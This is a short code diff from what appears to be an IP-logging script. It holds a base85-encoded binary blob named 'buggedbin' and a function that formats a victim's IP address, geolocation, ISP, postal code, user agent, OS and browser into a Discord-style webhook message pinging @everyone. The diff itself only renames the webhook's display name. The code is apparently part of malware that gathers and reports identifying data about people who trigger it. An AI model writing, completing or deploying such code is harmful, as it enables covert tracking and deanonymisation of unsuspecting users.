@@ -10,7 +10,7 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "Fentanyl",
+  "username": "bobs slave",
   "content": "@everyone",
   "embeds": [
     {
